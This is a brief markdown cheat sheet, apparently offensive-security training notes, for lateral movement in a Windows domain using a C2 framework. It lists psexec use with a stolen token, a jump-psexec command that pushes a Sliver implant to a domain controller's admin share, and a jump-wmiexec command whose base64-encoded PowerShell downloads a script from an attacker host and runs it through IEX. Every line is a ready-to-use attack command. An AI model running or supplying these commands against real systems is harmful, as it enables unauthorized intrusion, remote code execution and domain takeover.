# PsExec

### 1) Use psexec to move laterally after creating/stealing token

    psexec -d Title -s Description -p osep-lateral machine02.domain.com
    psexec -d Title -s Description -p osep-lateral DC06

### 2) Use the new session

    use a4a458c1

### 3) jump-psexec

    jump-psexec dc04 AgentSvc /home/kali/OSEP/hav0c/sliver.x64.exe //dc04/c$/file2.exe

### 4) jump-wmiexec

    jump-wmiexec client09 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
